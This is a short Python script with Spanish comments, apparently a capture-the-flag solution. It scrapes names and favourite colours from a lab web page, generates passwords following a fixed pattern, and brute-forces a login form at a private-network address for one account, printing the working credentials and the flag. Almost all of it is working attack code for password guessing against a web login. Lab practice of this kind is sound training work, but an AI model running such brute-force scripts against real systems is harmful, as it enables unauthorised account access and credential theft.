#!/usr/bin/python3
import requests
import subprocess
from bs4 import BeautifulSoup

ResponseGet = requests.get('http://192.168.114.68:8080/about.html')
#En primer lugar, vamos a intentar organizar los datos de cada usuario en una tabla para luego, de forma organizada intentar utilizar estas credenciales para acceder al área /login-3.

Soup = BeautifulSoup(ResponseGet.text, 'lxml')

TrashList = list(str(Soup.table).split('<tr>'))

username = "dvaliant@bedlamdynamics.com"
#Primero creamos sendas listas para nombres y colores favoritos.
users = ""
colors = ""
for i in range(2,len(TrashList)):
    users += TrashList[i].split('<td>')[1].replace('</td>','').replace('\n','')+","

users +="Brianne"


for i in range(2,len(TrashList)):
    colors += TrashList[i].split('<td>')[4].replace('</td>','').replace('\n','').replace('</tr>','')+","
    
colors += "cyan"
userList = list(users.split(','))
colorList = list(colors.replace('</tbody></table>','').split(','))

for i in range(0,len(userList)):#Seguidamente realizamos requests con todos las combinaciones posibles de acuerdo a las reglas del enunciado.
    for j in range(0,len(colorList)):
        FirstChar = colorList[j][0].swapcase()
        color = FirstChar
        for n in range(1,len(colorList[j])):
            color += colorList[j][n]

        password = userList[i]+color+userList[i]+color
        ResponsePost = requests.post('http://192.168.114.68:8080/login-3/index.php', data = {'username': username,'password': password})
        if not "[ERROR]" in ResponsePost.text:#Por último comprobamos la respuesta de cada request con el objetivo de verificar si está la Flag.
            print("[+] "+username+":"+password)
            Soup = BeautifulSoup(ResponsePost.text, 'lxml')
            print(Soup.body.div.contents[0].replace('\n',''))
            exit(0)
